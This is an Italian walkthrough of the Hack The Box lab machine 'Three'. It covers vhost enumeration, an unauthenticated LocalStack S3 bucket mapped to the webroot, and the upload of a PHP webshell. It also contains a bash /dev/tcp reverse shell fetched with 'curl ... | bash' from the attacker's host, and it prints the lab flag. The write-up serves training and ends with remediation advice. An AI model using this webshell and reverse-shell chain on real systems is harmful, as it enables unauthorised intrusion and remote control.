# HTB Starting Point — Three

**Platform:** Hack The Box — Starting Point Tier 1  
**OS:** Linux (Ubuntu)  
**Difficulty:** Very Easy  
**Focus:** Enumerazione vhost, misconfiguration S3 bucket, upload PHP webshell, reverse shell

---

## Summary

Three ospita un'applicazione web con un bucket Amazon S3 (LocalStack) mal configurato esposto come subdomain. Il bucket permette upload non autenticati e mappa direttamente sulla webroot di Apache. Caricare una webshell PHP garantisce Remote Code Execution, sfruttata per ottenere una reverse shell interattiva.

**Attack chain:**
```
vhost enumeration → S3 bucket discovery → unauthenticated upload
→ PHP webshell → RCE → reverse shell → flag
```

---

## Reconnaissance

### Nmap

```bash
sudo nmap 10.129.68.156 -sS -sV -sC -p 22,80 -A -O
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: The Toppers
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

![Nmap scan results](assets/nmap.png)

**Osservazioni chiave:**
- Host Linux (Ubuntu) — nessuna superficie d'attacco Windows
- Porta 80: Apache con PHP — applicazione web da enumerare
- Porta 22: SSH — utile se recuperiamo credenziali
- Solo due porte aperte — tutta la superficie d'attacco passa dal web

---

## Web Enumeration

### Setup /etc/hosts

Navigando su `http://10.129.68.156` si vede la landing page di "The Toppers". Il sito usa virtual hosting per nome, quindi aggiungiamo l'entry:

```bash
echo "10.129.68.156 thetoppers.htb" | sudo tee -a /etc/hosts
```

### Analisi source code

Ispezionando il sorgente della pagina si notano include PHP dinamici per il rendering dei contenuti — segnale che potrebbero esistere virtual host aggiuntivi.

![Source code — include PHP dinamici](assets/source-code.png)

### Enumerazione virtual host

```bash
gobuster vhost \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -u http://thetoppers.htb \
  --append-domain
```

> **Nota:** Il flag `--append-domain` è necessario nelle versioni recenti di gobuster per appendere correttamente `.thetoppers.htb` ad ogni entry della wordlist.

```
s3.thetoppers.htb     Status: 404 [Size: 21]
```

![Gobuster vhost — s3.thetoppers.htb scoperto](assets/gobuster-vhost.png)

`s3.thetoppers.htb` è immediatamente riconoscibile — il prefisso `s3` è la convenzione standard per i bucket Amazon S3. Il 404 conferma che il vhost è attivo ma non trova contenuto al path root, comportamento tipico di un endpoint S3/LocalStack.

```bash
echo "10.129.68.156 s3.thetoppers.htb" | sudo tee -a /etc/hosts
```

---

## S3 Bucket Enumeration

### Configurazione AWS CLI

Il bucket è servito da LocalStack — un emulatore locale dei servizi AWS. L'autenticazione non è applicata, quindi qualsiasi credenziale funziona:

```bash
aws configure
# AWS Access Key ID:     temp
# AWS Secret Access Key: temp
# Default region name:   us-east-1
# Default output format: json
```

### Listing del bucket

```bash
aws --endpoint-url http://s3.thetoppers.htb s3 ls
```

```
2024-XX-XX XX:XX:XX thetoppers.htb
```

```bash
aws --endpoint-url http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
```

```
                           PRE images/
2024-XX-XX XX:XX:XX      0 .htaccess
2024-XX-XX XX:XX:XX  11952 index.php
```

**Osservazione critica:** il bucket contiene `index.php` e una cartella `images/` — identici alla webroot di Apache. Il bucket S3 è il backend storage del web server. Qualsiasi file caricato nel bucket sarà immediatamente accessibile via HTTP.

### Verifica permessi di scrittura

```bash
aws --endpoint-url http://s3.thetoppers.htb s3 cp test.txt s3://thetoppers.htb
```

Upload eseguito senza autenticazione — il bucket non ha restrizioni in scrittura.

---

## Exploitation — Upload PHP Webshell

### Creazione della webshell

Il server gira su PHP. Una webshell minimale permette di eseguire comandi OS tramite il parametro GET `cmd`:

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

### Upload nel bucket S3

```bash
aws --endpoint-url http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
```

```
upload: ./shell.php to s3://thetoppers.htb/shell.php
```

### Verifica RCE

```
http://thetoppers.htb/shell.php?cmd=id
```

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

![RCE confermata — output del comando id nel browser](assets/rce-id.png)

**RCE confermata.** Il server esegue i comandi come utente `www-data`.

---

## Reverse Shell

La webshell è funzionale ma limitata — nessuna interattività, nessun job control. Si scala a una shell interattiva completa.

### Setup — macchina attaccante

**Terminale 1 — Netcat listener:**
```bash
nc -lvnp 4444
```

**Creazione dello script reverse shell:**
```bash
echo 'bash -i >& /dev/tcp/10.10.14.212/4444 0>&1' > shell.sh
```

**Terminale 2 — HTTP server per servire il file:**
```bash
python3 -m http.server 8000
```

### Trigger via webshell

```
http://thetoppers.htb/shell.php?cmd=curl+http://10.10.14.212:8000/shell.sh|bash
```

Il target scarica `shell.sh` dal nostro HTTP server e lo pipa direttamente a `bash` — nessun file viene scritto sul disco del target.

![Python HTTP server che serve shell.sh + netcat con connessione ricevuta](assets/reverse-shell.png)

**Connessione ricevuta:**
```
connect to [10.10.14.212] from (UNKNOWN) [10.129.68.156] 56246
bash: no job control in this shell
www-data@three:/var/www/html$
```

---

## Flag

```bash
www-data@three:/var/www/html$ ls
images  index.php  shell.php

www-data@three:/var/www/html$ cd ..

www-data@three:/var/www$ ls
flag.txt  html

www-data@three:/var/www$ cat flag.txt
a980d99281a28d638ac68b9bf9453c2b
```

![Navigazione a /var/www e lettura della flag](assets/flag.png)

> La flag si trovava una directory sopra la webroot in `/var/www/flag.txt` — non dentro `html/`. Enumerare sempre le directory padre dopo aver ottenuto la shell.

**Flag:** `a980d99281a28d638ac68b9bf9453c2b`

---

## Vulnerability Summary

| Categoria | Dettaglio |
|---|---|
| Misconfiguration | S3 bucket con scrittura non autenticata |
| Root Cause | LocalStack esposto pubblicamente, nessuna policy ACL sul bucket |
| Impact | File upload arbitrario → esecuzione PHP → RCE completa → shell |
| Fix | Applicare bucket policy restrittive; limitare la scrittura a principal autenticati; non esporre LocalStack su interfacce pubbliche; disabilitare l'esecuzione PHP nelle directory di upload |

---

## Key Takeaways

- **Gobuster `--append-domain`** è necessario nelle versioni recenti per una corretta enumerazione vhost — senza questo flag le entry non vengono appese al dominio base
- **S3 bucket = webroot** — quando un bucket mappa direttamente sulla webroot PHP, un upload non autenticato equivale a RCE
- **`curl url | bash`** è il metodo più pulito per triggare una reverse shell in un singolo step — il payload viene eseguito in memoria senza scrivere file sul target
- **AWS CLI funziona con credenziali fake su LocalStack** — l'autenticazione non è validata se il server non è configurato per farlo
- **Enumerare le directory padre dopo aver ottenuto la shell** — la flag era in `/var/www/`, non nella webroot `/var/www/html/`
